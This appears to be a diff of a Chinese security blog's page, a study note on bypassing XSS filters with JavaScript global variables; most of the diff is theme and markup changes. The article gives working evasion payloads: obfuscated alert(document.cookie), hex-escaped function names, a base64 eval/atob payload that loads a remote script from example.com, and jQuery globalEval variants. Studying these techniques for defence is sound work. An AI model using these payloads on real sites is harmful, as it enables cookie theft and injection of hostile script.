@@ -1,6 +1,103 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>Bypass XSS filters using JavaScript global variables（笔记） · damn1t</title><meta name="description" content="Bypass XSS filters using JavaScript global variables前言很有意思的一篇文章，学到了一些姿势，以下仅作笔记
-你所需要知道的什么是js全局变量？
-A JavaScript global variable is declared outside the "><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Bypass XSS filters using JavaScript global variables（笔记）</a></h3></div><div class="post-content"><h1 id="Bypass-XSS-filters-using-JavaScript-global-variables"><a href="#Bypass-XSS-filters-using-JavaScript-global-variables" class="headerlink" title="Bypass XSS filters using JavaScript global variables"></a>Bypass XSS filters using JavaScript global variables</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很有意思的一篇文章，学到了一些姿势，以下仅作笔记</p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Bypass XSS filters using JavaScript global variables（笔记） · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Bypass XSS filters using JavaScript global variables（笔记）</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-06-19</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="xss"> xss</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Bypass-XSS-filters-using-JavaScript-global-variables"><a href="#Bypass-XSS-filters-using-JavaScript-global-variables" class="headerlink" title="Bypass XSS filters using JavaScript global variables"></a>Bypass XSS filters using JavaScript global variables</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很有意思的一篇文章，学到了一些姿势，以下仅作笔记</p>
 <h2 id="你所需要知道的"><a href="#你所需要知道的" class="headerlink" title="你所需要知道的"></a>你所需要知道的</h2><h3 id="什么是js全局变量？"><a href="#什么是js全局变量？" class="headerlink" title="什么是js全局变量？"></a>什么是js全局变量？</h3><blockquote>
 <p>A JavaScript global variable is declared outside the function or declared with window object. It can be accessed from any function. <a href="https://www.javatpoint.com/javascript-global-variable" target="_blank" rel="noopener">https://www.javatpoint.com/javascript-global-variable</a></p>
 </blockquote>
@@ -29,15 +126,48 @@ A JavaScript global variable is declared outside the "><meta name="keywords" con
 <ul>
 <li>frames</li>
 </ul>
-<h2 id="1-级联和hex编码方式"><a href="#1-级联和hex编码方式" class="headerlink" title="1.级联和hex编码方式"></a>1.级联和hex编码方式</h2><p>有很多的WAF使用的过滤器都是基于JS的函数的黑名单模式，大多数都包含了诸如<code>alert()</code>或者<code>String.fromCharCode()</code>。幸好我们有全局变量，所以我们可以轻松的bypass，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">** alert(document.cookie);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self[&quot;ale&quot;+&quot;rt&quot;](self[&quot;doc&quot;+&quot;ument&quot;][&quot;coo&quot;+&quot;kie&quot;])</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-3.png" alt=""></p>
-<p>稍复杂的绕过限制的方式是将字符串替换为以<code>\x</code>格式编码的hex序列（ascii码低于256）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; console.log(&quot;\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;)</span><br><span class="line">&lt; hello, world!</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-2.png" alt=""></p>
+<h2 id="1-级联和hex编码方式"><a href="#1-级联和hex编码方式" class="headerlink" title="1.级联和hex编码方式"></a>1.级联和hex编码方式</h2><p>有很多的WAF使用的过滤器都是基于JS的函数的黑名单模式，大多数都包含了诸如<code>alert()</code>或者<code>String.fromCharCode()</code>。幸好我们有全局变量，所以我们可以轻松的bypass，例如：</p>
+<pre><code>/*
+** alert(document.cookie);
+*/
+
+self[&quot;ale&quot;+&quot;rt&quot;](self[&quot;doc&quot;+&quot;ument&quot;][&quot;coo&quot;+&quot;kie&quot;])
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-3.png" alt=""></p>
+<p>稍复杂的绕过限制的方式是将字符串替换为以<code>\x</code>格式编码的hex序列（ascii码低于256）：</p>
+<pre><code>&gt; console.log(&quot;\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;)
+&lt; hello, world!
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-2.png" alt=""></p>
 <p>我们可以将其替换我们想使用的任意函数</p>
 <h2 id="eval以及利用base64加密"><a href="#eval以及利用base64加密" class="headerlink" title="eval以及利用base64加密"></a>eval以及利用base64加密</h2><p>对于过滤我们输入的WAF，其中一个困难的事情就是动态创建或添加一个调用远程js文件的<code>script</code>元素。即使是一个功能不那么强大的过滤器，构建依然是困难的，因为这里有太多可识别的字符（<code>&lt;script</code>, <code>src=</code>, <code>http://</code>等等）</p>
-<p>所以我们就可以利用<strong>base64</strong>和<code>eval()</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self[&quot;\x65\x76\x61\x6c&quot;](//eval</span><br><span class="line">  self[&quot;\x61\x74\x6f\x62&quot;](//atob</span><br><span class="line">    &quot;dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\</span><br><span class="line">    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\</span><br><span class="line">    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\</span><br><span class="line">    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\</span><br><span class="line">    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\</span><br><span class="line">    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\</span><br><span class="line">    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\</span><br><span class="line">    5kQ2hpbGQoc2NyaXB0KTs=&quot;</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
-<p>base64即是编码的如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// select head tag</span><br><span class="line">var head = document.getElementsByTagName(&apos;head&apos;).item(0); </span><br><span class="line"></span><br><span class="line">// create an empty &lt;script&gt; element</span><br><span class="line">var script = document.createElement(&apos;script&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element type attribute</span><br><span class="line">script.setAttribute(&apos;type&apos;, &apos;text/javascript&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element src attribute</span><br><span class="line">script.setAttribute(&apos;src&apos;,&apos;http://example.com/my.js&apos;);</span><br><span class="line"></span><br><span class="line">// append it to the head element</span><br><span class="line">head.appendChild(script);</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-13.png" alt=""></p>
+<p>所以我们就可以利用<strong>base64</strong>和<code>eval()</code>:</p>
+<pre><code>self[&quot;\x65\x76\x61\x6c&quot;](//eval
+  self[&quot;\x61\x74\x6f\x62&quot;](//atob
+    &quot;dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\
+    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\
+    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\
+    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\
+    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\
+    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\
+    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\
+    5kQ2hpbGQoc2NyaXB0KTs=&quot;
+  )
+)
+</code></pre><p>base64即是编码的如下代码：</p>
+<pre><code>// select head tag
+var head = document.getElementsByTagName(&#39;head&#39;).item(0); 
+
+// create an empty &lt;script&gt; element
+var script = document.createElement(&#39;script&#39;);
+
+// set the script element type attribute
+script.setAttribute(&#39;type&#39;, &#39;text/javascript&#39;);
+
+// set the script element src attribute
+script.setAttribute(&#39;src&#39;,&#39;http://example.com/my.js&#39;);
+
+// append it to the head element
+head.appendChild(script);
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-13.png" alt=""></p>
 <h2 id="3-jQuery"><a href="#3-jQuery" class="headerlink" title="3.jQuery"></a>3.jQuery</h2><p>现在的网站大量利用了诸如jQuery的第三方库。当<code>self[&quot;eval&quot;]</code>和hex编码无法使用，于是我们可以利用如<code>self[&quot;$&quot;][&quot;globalEval&quot;]</code></p>
 <table><br>  <tr><th>PAYLOAD</th><th>ACTION</th><br>  </tr><tr><td><code>self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</code></td><td>pass</td></tr><br>  <tr><td><code>self[&quot;\x24&quot;]
 [&quot;\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c&quot;]
@@ -61,13 +191,41 @@ A JavaScript global variable is declared outside the "><meta name="keywords" con
 </table>
 <p><img src="https://www.secjuice.com/content/images/2019/06/image-12.png" alt=""></p>
 <h2 id="4-Iteration-and-Object-keys"><a href="#4-Iteration-and-Object-keys" class="headerlink" title="4.Iteration and Object.keys"></a>4.Iteration and Object.keys</h2><p><code>Object.keys()</code>以数组形式返回所给的对象所拥有的属性（property）名称，与正常循环相同的顺序。<br><img src="https://www.secjuice.com/content/images/2019/06/image.png" alt=""></p>
-<p>这意味着我们可以通过使用索引号而不是函数名来访问任何JavaScript函数。例如，打开浏览器的Web控制台并键入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=0; for(i in self) &#123; if(i == &quot;alert&quot;) &#123; console.log(c); &#125; c++; &#125;</span><br></pre></td></tr></table></figure></p>
-<p>这为您提供了self对象中“alert”函数的索引号。每个浏览器和每个打开的文档（在我的示例中为5）的数字不同，但它可以使您无需使用其名称即可调用任何函数。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Object.keys(self)[5]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[5]](&quot;foo&quot;) // alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-1.png" alt=""></p>
-<p>为了迭代<code>self</code>中的所有函数，你可以遍历<code>self</code>对象并检查元素是否是使用<code>typeof elm ===“function”</code>的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=&quot;&quot;</span><br><span class="line">for(i in self) &#123;</span><br><span class="line">    if(typeof self[i] === &quot;function&quot;) &#123;</span><br><span class="line">        f += i+&quot;, &quot;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br><span class="line">console.log(f)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-14.png" alt=""></p>
-<p>如前所述，这个数字可以在不同的浏览器和文档上更改，因此，如果不允许“alert”字符串并且不能使用上述任何方法，我们如何找到“alert”索引号？JavaScript为您提供了很多机会。我们可以做的一件事是为变量分配（a），一个迭代<code>self</code>并找到<code>alert</code>索引号的函数。然后，我们可以使用<code>test（）</code>来查找带有正则表达式的“alert”，如<code>^ a [rel] + t $</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = function() &#123;</span><br><span class="line">    c=0; // index counter</span><br><span class="line">    for(i in self) &#123;</span><br><span class="line">        if(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            return c;</span><br><span class="line">        &#125;</span><br><span class="line">        c++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// in one line</span><br><span class="line">a=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125;</span><br><span class="line"></span><br><span class="line">// then you can use a() with Object.keys</span><br><span class="line">// alert(&quot;foo&quot;)</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;foo&quot;)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.secjuice.com/content/images/2019/06/image-7.png" alt=""></p>
+<p>这意味着我们可以通过使用索引号而不是函数名来访问任何JavaScript函数。例如，打开浏览器的Web控制台并键入：</p>
+<pre><code>c=0; for(i in self) { if(i == &quot;alert&quot;) { console.log(c); } c++; }
+</code></pre><p>这为您提供了self对象中“alert”函数的索引号。每个浏览器和每个打开的文档（在我的示例中为5）的数字不同，但它可以使您无需使用其名称即可调用任何函数。例如：</p>
+<pre><code>&gt; Object.keys(self)[5]
+&lt; &quot;alert&quot;
+&gt; self[Object.keys(self)[5]](&quot;foo&quot;) // alert(&quot;foo&quot;)
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-1.png" alt=""></p>
+<p>为了迭代<code>self</code>中的所有函数，你可以遍历<code>self</code>对象并检查元素是否是使用<code>typeof elm ===“function”</code>的函数:</p>
+<pre><code>f=&quot;&quot;
+for(i in self) {
+    if(typeof self[i] === &quot;function&quot;) {
+        f += i+&quot;, &quot;
+    } 
+};
+console.log(f)
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-14.png" alt=""></p>
+<p>如前所述，这个数字可以在不同的浏览器和文档上更改，因此，如果不允许“alert”字符串并且不能使用上述任何方法，我们如何找到“alert”索引号？JavaScript为您提供了很多机会。我们可以做的一件事是为变量分配（a），一个迭代<code>self</code>并找到<code>alert</code>索引号的函数。然后，我们可以使用<code>test（）</code>来查找带有正则表达式的“alert”，如<code>^ a [rel] + t $</code>：</p>
+<pre><code>a = function() {
+    c=0; // index counter
+    for(i in self) {
+        if(/^a[rel]+t$/.test(i)) {
+            return c;
+        }
+        c++;
+    }
+}
+
+// in one line
+a=()=&gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}
+
+// then you can use a() with Object.keys
+// alert(&quot;foo&quot;)
+
+self[Object.keys(self)[a()]](&quot;foo&quot;)
+</code></pre><p><img src="https://www.secjuice.com/content/images/2019/06/image-7.png" alt=""></p>
 <p>注：</p>
 <blockquote>
 <p>test() 方法用于检测一个字符串是否匹配某个模式.<br>语法：<br>RegExpObject.test(string)</p>
@@ -75,4 +233,4 @@ A JavaScript global variable is declared outside the "><meta name="keywords" con
 <p>说明：<br>调用 RegExp 对象 r 的 test() 方法，并为它传递字符串 s，与这个表示式是等价的：(r.exec(s) != null)。</p>
 </blockquote>
 <p>原文地址：<br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-06-19</span><i class="fa fa-tag"></i><a class="tag" href="/tags/xss/" title="xss">xss </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/,damn1t,Bypass XSS filters using JavaScript global variables（笔记）,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/06/21/python/Pyppeteer学习笔记/" title="Pyppeteer学习笔记">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title="MyBB &lt;= 1.8.20--(From Stored XSS to RCE)">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/">http://microvorld.com/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/06/21/python/Pyppeteer学习笔记/" title="Pyppeteer学习笔记"><span>< PreviousPost</span><br><span class="prevTitle">Pyppeteer学习笔记</span></a><a class="nextSlogan" href="/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title="MyBB &lt;= 1.8.20--(From Stored XSS to RCE)"><span>NextPost ></span><br><span class="nextTitle">MyBB &lt;= 1.8.20--(From Stored XSS to RCE)</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bypass-XSS-filters-using-JavaScript-global-variables"><span class="toc-number">1.</span> <span class="toc-text">Bypass XSS filters using JavaScript global variables</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你所需要知道的"><span class="toc-number">1.2.</span> <span class="toc-text">你所需要知道的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是js全局变量？"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是js全局变量？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于-“self”-对象"><span class="toc-number">1.2.2.</span> <span class="toc-text">关于 “self” 对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-级联和hex编码方式"><span class="toc-number">1.3.</span> <span class="toc-text">1.级联和hex编码方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval以及利用base64加密"><span class="toc-number">1.4.</span> <span class="toc-text">eval以及利用base64加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-jQuery"><span class="toc-number">1.5.</span> <span class="toc-text">3.jQuery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Iteration-and-Object-keys"><span class="toc-number">1.6.</span> <span class="toc-text">4.Iteration and Object.keys</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
